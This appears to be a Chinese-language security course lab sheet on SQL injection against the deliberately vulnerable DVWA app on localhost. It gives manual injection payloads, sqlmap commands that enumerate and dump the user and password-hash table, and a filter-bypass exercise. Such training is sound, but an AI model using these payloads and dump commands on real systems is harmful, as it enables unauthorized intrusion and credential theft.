# Week 3 — SQL 注入实战

> **靶场**: DVWA (Low→Medium→High) | **工具**: sqlmap, nuclei, ffuf
> **技能**: `sqli-sql-injection` | **难度**: ⭐⭐ | **预计时间**: 6 小时

## 本周目标

从手工注入到自动化利用，掌握 SQL 注入的完整攻击链：**检测 → 数据库指纹 → 数据提取 → 提权**。

## 练习任务

### 任务 1: 手工检测 (1.5h)

DVWA 安全等级切换到 **Low**，访问 `/vulnerabilities/sqli/`

```bash
# Step 1: 确认注入点
# 浏览器访问: http://localhost:8080/vulnerabilities/sqli/?id=1&Submit=Submit
# 观察正常响应

# Step 2: 注入检测 Payload
# 在输入框或 URL 中测试:
#   '                    → 预期报错（SQL 语法错误）
#   1' or '1'='1        → 预期返回所有用户
#   1' or 1=1--         → 同上（注释掉后续 SQL）
#   ' UNION SELECT 1,2-- → 测试列数

# Step 3: 确认数据库类型
#   ' UNION SELECT @@version,2--  → MySQL 版本
#   ' UNION SELECT user(),2--      → 当前数据库用户
```

### 任务 2: sqlmap 自动化 (2h)

```bash
# 基础检测
sqlmap -u "http://localhost:8080/vulnerabilities/sqli/?id=1&Submit=Submit" \
  --cookie="PHPSESSID=<YOUR_SESSION>; security=low" --batch

# 获取数据库列表
sqlmap -u "..." --cookie="..." --dbs --batch

# 获取当前数据库的表
sqlmap -u "..." --cookie="..." -D dvwa --tables --batch

# 获取 users 表的列
sqlmap -u "..." --cookie="..." -D dvwa -T users --columns --batch

# 导出数据
sqlmap -u "..." --cookie="..." -D dvwa -T users -C user,password --dump --batch
```

### 任务 3: 难度升级 (2h)

1. 切换到 **Medium** 等级（使用 POST 方法，有简单过滤）
2. 切换到 **High** 等级（使用分离的页面，有更严格的过滤）
3. 尝试 **Impossible** 等级（使用了参数化查询，理论无法注入）

```bash
# Medium 等级: POST 方法
sqlmap -u "http://localhost:8080/vulnerabilities/sqli/" \
  --data="id=1&Submit=Submit" \
  --cookie="PHPSESSID=<SID>; security=medium" --batch

# High 等级: 观察页面跳转行为，调整 sqlmap 参数
```

### 任务 4: WAF 绕过尝试 (30min)

即使无法成功注入 Impossible 等级，也要记录：
- WAF/过滤机制的特征
- 尝试了哪些绕过方法
- 哪种绕过最接近成功？

## 交付物

在 `NOTES.md` 中记录：

```markdown
## Low 等级
- 注入点: GET 参数 id
- 数据库类型: _____
- 用户表结构: _____
- 获取到的密码哈希: _____

## Medium 等级
- 使用的 sqlmap 参数: _____
- 过滤机制: _____

## High 等级
- 是否成功: [是/否]
- 遇到的困难: _____

## 踩坑记录
- 遇到的问题: _____
- 解决方法: _____
```
